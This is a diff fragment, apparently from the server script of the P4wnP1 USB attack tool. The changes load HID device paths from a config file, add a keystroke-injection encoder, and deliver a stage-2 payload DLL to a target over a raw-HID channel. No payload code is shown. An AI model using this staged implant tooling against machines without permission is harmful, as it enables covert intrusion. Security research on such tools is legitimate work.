-		self.send(P4wnP1.CHANNEL_TYPE_CONTROL, P4wnP1.CHANNEL_SUBTYPE_CONTROL_SERVER_SYSINFO_REQUEST)
-		
-		# wait for response from input handler, by using a dedicated Channel (get blocks till data received)
-		print self.control_sysinfo_response.get()
-
-
-	def do_test(self, line):
-		self.rpm.startProc(line)
 
 if __name__ == "__main__":
-	try:
-		dev_file_in_path = "/dev/hidg1"
-		dev_file_out_path = "/dev/hidg1"
+	config = Config.conf_to_dict("config.txt")
 
+	try:
+		#dev_file_in_path = "/dev/hidg1"
+		#dev_file_out_path = "/dev/hidg1"
+
+		dev_file_in_path = config["HID_RAW_DEV"]
+		dev_file_out_path = config["HID_RAW_DEV"]
+
+		
 		HIDin_file = open(dev_file_in_path, "rb")
 		HIDout_file = open(dev_file_out_path, "wb")
 
 		# the linklayer starts several communication threads
 		# for raw HID communication, the threads are started with separate start() method
 		ll = LinkLayer(HIDin_file, HIDout_file)
-
+		
 		# transport layer automatically registers for linklayer events using pydispatcher
 		# in current implementation LinkLayer does nothing but providing an inbound queue
 		# Note: As every stream crosses TransportLayer, that would be the place to manipulate
 		#	streams if needed (for example encryption)
 		tl = TransportLayer()		
 
+		enc = DuckEncoder()
+		enc.setKeyDevFile(config["HID_KEYBOARD_DEV"])
+		enc.setLanguage(config["KEYBOARD_LANG"])
+		
+		p4wnp1 = P4wnP1(ll, tl, duckencoder = enc)
+		#with open("stage2.ps1", "rb") as f:
+		with open("P4wnP1.dll", "rb") as f:
+			p4wnp1.set_stage2(f.read())
+		p4wnp1.start() # starts link layer (waiting for initial connection) and server input thread
+		p4wnp1.cmdloop()
 
-		server = P4wnP1(ll, tl)
-		with open("stage2.ps1", "rb") as f:
-			server.set_stage2(f.read())
-		server.start() # starts link layer (waiting for initial connection) and server input thread
-		server.cmdloop()
-
-	except Exception as e:
-		print "Exception: " + str(type(e)) + ":"
-		print "\t{}".format(e.message)
-		exc_type, exc_obj, exc_tb = sys.exc_info()
-		print "\tLine: {}".format(exc_tb.tb_lineno)
+	except:
+		#print "Exception: " + str(type(e)) + ":"
+		#print "\t{}".format(e.message)
+		#exc_type, exc_obj, exc_tb = sys.exc_info()
+		#print "\tLine: {}".format(exc_tb.tb_lineno)
+		raise
 	finally:
 
 		print "Cleaning Up..."
@@ -574,7 +531,7 @@ if __name__ == "__main__":
 		HIDout_file.close()
 		HIDin_file.close()
 		try:
-			server.stop()
+			p4wnp1.stop()
 		except:
 			pass
 		sys.exit()
